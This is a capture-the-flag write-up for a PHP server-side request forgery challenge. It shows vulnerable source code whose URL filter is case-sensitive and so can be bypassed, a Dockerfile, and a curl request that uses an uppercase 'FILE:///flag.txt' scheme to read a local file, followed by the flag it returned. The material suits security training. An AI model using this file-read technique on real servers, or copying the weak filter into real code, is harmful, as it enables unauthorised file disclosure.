
## source code 
```php
<?php

function send($link){

$curl_handle=curl_init();

curl_setopt($curl_handle,CURLOPT_URL,$link);

curl_setopt($curl_handle,CURLOPT_CONNECTTIMEOUT,2);

curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);

$buffer = curl_exec($curl_handle);

curl_close($curl_handle);


if (empty($buffer)){
return "Nothing returned from url.<p>";
}else{
return $buffer;
}
}

  
  

if (!empty($_GET['url'])){
$url=$_GET['url'];

if(preg_match('/^http/',$url) || !preg_match('/file/',$url)){
echo send($url);
}else{
die("Don't Hack Me Plzzz");
}

}

?>


<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

</head>

<body>

Hello

</body>

</html>

```

## docker file 
```docker 
FROM php:7.4-apache

# Copy files from the src/ folder to the image

COPY src/ /var/www/html

COPY flag.txt /

# Expose port 80 for Apache

EXPOSE 80
```

## breakdown for the code 
- using `url` get parameter the app take a url and get the content of it
- the words `http` and `file` is blocked

##### protocol scheme are acceptable in small and capital letters so juts use
```
FILE:///flag.txt
```

```bash
curl "http://20.121.4.239:1337/?url=FILE:///flag.txt"     

CATF{An0Th3er_EZzzzZz_On3}   
  
<html lang="en">  
<head>  
   <meta charset="UTF-8">  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
   <title>Document</title>  
</head>  
<body>  
   Hello  
</body>  
</html>
```

##### here is our flag
```
CATF{An0Th3er_EZzzzZz_On3}
```